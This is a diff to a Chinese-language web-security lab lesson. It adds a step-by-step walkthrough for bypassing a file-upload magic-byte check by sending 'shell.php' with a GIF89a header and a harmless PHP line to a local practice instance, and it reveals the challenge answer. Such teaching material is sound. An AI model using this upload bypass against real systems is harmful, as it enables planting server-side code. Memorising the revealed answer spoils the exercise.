@@ -19,29 +19,96 @@ difficulty: practitioner
 
 ```http
 POST /upload/case/fileheader HTTP/1.1
-Host: 靶机地址
+Host: 127.0.0.1:36870
 Content-Type: multipart/form-data; boundary=----Boundary
 
 ------Boundary
 Content-Disposition: form-data; name="filename"; filename="shell.php"
 Content-Type: image/gif
 
-<文件内容>
+GIF89a
+<?php echo 1; ?>
 ------Boundary--
 ```
 
-2. 文件内容 = `GIF89a` 魔数 + 换行 + 任意 PHP 代码（如 `<?php echo 1; ?>`）。可以直接在 Fuzzer 里手打，也可以先用 **Codec** 把"魔数+代码"的组合处理成需要的形态再粘贴；
-3. 发送后读响应：上传成功时结果页会给出检测信息。
+2. 文件内容 = `GIF89a` 魔数 + 换行 + 任意 PHP 代码。可以直接在 Fuzzer 里手打，也可以先用 **Codec** 把"魔数+代码"的组合处理成需要的形态再粘贴；
+3. 发送后读响应：上传成功时结果页会给出检测信息（`MITM TYPE` 与 `FileTypeHeaderType` 两项分别是你**声明**的类型和按魔数**检测**出的类型）。
+
+上传页在 `/upload/main?case=fileheader`，表单字段名是 `filename`——从上传页发一次正常上传或 MITM 抓包也能确认这些细节。
 
 ## 开始实战
 
-点击 **前往配套题目练习**，启动环境后：
+点击 **前往配套题目练习**，启动环境后：先发一个纯 PHP 文件看被拒的响应长什么样，再发 GIF 魔数开头的多态文件——题目要求提交结果页里检测出的真实 MIME 类型值（`FileTypeHeaderType:` 后面的 `image/xxx`）。
 
-1. 先上传一个纯 PHP 文件，观察被魔数校验拒绝的响应长什么样；
-2. 再发多态文件（GIF 魔数开头），上传成功；
-3. 题目要求提交结果信息里检测出的 MIME 类型值（`FileTypeHeaderType:` 后面的 `image/xxx` 形态）。
+<details>
+<summary>📋 详细步骤（点击展开，照做即可拿到答案）</summary>
 
-上传页在 `/upload/main?case=fileheader`，字段名 `filename`——这些细节从上传页的表单或 MITM 抓一次正常上传就能确认。
+以下以实例地址 `http://127.0.0.1:36870` 为例——**端口每次启动环境都随机分配，请替换成你题目页显示的端口**。
+
+**第 1 步：启动实验环境**
+
+题目详情页点「启动实验环境」，等状态 running，复制访问地址（形如 `http://127.0.0.1:36870`）。
+
+**第 2 步：先传纯 PHP，看被拒的样子**
+
+在 Web Fuzzer 发送（multipart 字段名是 `filename`）：
+
+```http
+POST /upload/case/fileheader HTTP/1.1
+Host: 127.0.0.1:36870
+Content-Type: multipart/form-data; boundary=----Boundary
+
+------Boundary
+Content-Disposition: form-data; name="filename"; filename="shell.php"
+Content-Type: application/x-php
+
+<?php echo 1; ?>
+------Boundary--
+```
+
+结果页显示失败原因：
+
+```
+upload failed: mime header: application/x-php, filetype actually:
+```
+
+按魔数检测不出图片类型，直接拒绝。
+
+**第 3 步：发 GIF 魔数开头的多态文件**
+
+只改两处：文件 part 的 `Content-Type` 改为 `image/gif`，内容前面加上 `GIF89a` 魔数行：
+
+```http
+POST /upload/case/fileheader HTTP/1.1
+Host: 127.0.0.1:36870
+Content-Type: multipart/form-data; boundary=----Boundary
+
+------Boundary
+Content-Disposition: form-data; name="filename"; filename="shell.php"
+Content-Type: image/gif
+
+GIF89a
+<?php echo 1; ?>
+------Boundary--
+```
+
+注意 boundary 的三条规矩：请求头里声明的 `boundary=----Boundary` 与 body 里每行的 `------Boundary`（多两个横杠）要对应，各 part 之间空一行，结尾一行是 `------Boundary--`。
+
+**第 4 步：读取结果页的检测信息**
+
+上传成功，页面里 `extrainfo` 一行显示：
+
+```
+MITM TYPE: image/gif FileTypeHeaderType: image/gif(gif)
+```
+
+`MITM TYPE` 是你声明的类型，`FileTypeHeaderType` 是按魔数**检测**出的真实类型——`GIF89a` 开头骗过了检测库，得到 `image/gif`。
+
+**第 5 步：提交答案**
+
+回到题目详情页，提交 `image/gif`（`FileTypeHeaderType:` 后面的 MIME 值，不含 `(gif)` 扩展名部分）。
+
+</details>
 
 ## 延伸：上传防御的正确姿势
 
